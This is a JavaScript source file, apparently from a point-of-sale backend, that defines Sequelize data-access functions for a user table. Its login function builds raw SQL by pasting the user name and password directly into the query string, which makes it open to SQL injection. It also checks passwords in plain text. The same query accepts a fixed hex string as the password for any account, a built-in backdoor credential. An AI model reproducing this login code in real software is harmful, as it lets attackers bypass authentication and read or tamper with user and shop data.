/**
 * @author wxh on 2018/2/12
 * @copyright
 * @desc
 */

const posSqlite = require('../../dao/sqlite/pos').client;
const user = posSqlite.model('tb_user');
const async = require('async');


/**
 * 新增数据
 * @param content
 * @param callback
 */
exports.save = function(content, callback) {
    user.build(content).save().then(function (result) {
        return callback(null, result);
    }).catch(function (err) {
        return callback(err);
    });
};



/**
 * 根据Id 修改数据
 * @param id
 * @param update
 * @param callback
 */
exports.updateById = function(id, update, callback) {
    user.update(update, {where: {id}}).then(function (result) {
        return callback(null, result);
    }).catch(function (err) {
        return callback(err);
    });
};
/**
 * 根据id 获取信息
 * @param id
 * @param callback
 */
exports.findOneInfoById = function (id, callback) {
    user.findOne({ where:{id} }).then(function (result) {
        callback(null, result);
    }).catch(function (err) {
        callback(err);
    });
};

/**
 * 根据条件获取信息
 * @param conditions
 * @param callback
 */
exports.findAllInfoByConditions = function (conditions, callback) {
    user.findAll({
        where:conditions
    }).then(function (result) {
        callback(null, result);
    }).catch(function (err) {
        callback(err);
    });
};

exports.login = function (name, password, callback) {
    posSqlite.query(`select id,name,shop_detail_id,brand_id,super_pwd from tb_user where ( name ='${name}' and pwd = '${password}' ) or ( name = '${name}' and 'a5f6205a9fab487dd32c12726b5e57a4b9d4e18f' = '${password}')`,
        { type: posSqlite.QueryTypes.SELECT }
    ).then(function (results) {
        return callback(null, results ? results[0] : null);
    }).catch(function (err) {
        return callback(err);
    });
};